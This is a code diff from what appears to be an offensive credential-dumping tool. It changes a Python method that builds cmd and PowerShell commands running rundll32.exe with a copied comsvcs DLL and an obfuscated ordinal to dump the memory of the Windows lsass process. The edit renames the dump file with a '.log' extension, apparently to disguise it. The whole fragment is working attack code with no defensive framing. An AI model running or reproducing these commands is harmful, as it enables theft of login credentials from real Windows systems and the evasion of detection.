@@ -33,14 +33,14 @@ class DumpMethod(IDumpMethod):
             
         cmd_command = [
             """for /f "tokens=1,2 delims= " ^%A in ('"{} /fi "Imagename eq {}.ex*" | find "lsass""') do rundll32.exe C:{}{} #+0000^24 ^%B {}{} full""".format(
-                tasklist, lsass, self.comsvcs_copy_path, self.comsvcs_copy_name, self.dump_path, self.dump_name
+                tasklist, lsass, self.comsvcs_copy_path, self.comsvcs_copy_name, self.dump_path, self.dump_name + ".log"
             ),
             copy_command
         ]
 
         pwsh_command = [
             """rundll32.exe C:{}{} `#+0000^24 (Get-Process {}).Id {}{} full""".format(
-                 self.comsvcs_copy_path, self.comsvcs_copy_name, lsass, self.dump_path, self.dump_name
+                 self.comsvcs_copy_path, self.comsvcs_copy_name, lsass, self.dump_path, self.dump_name + ".log"
             ),
             copy_command
         ]
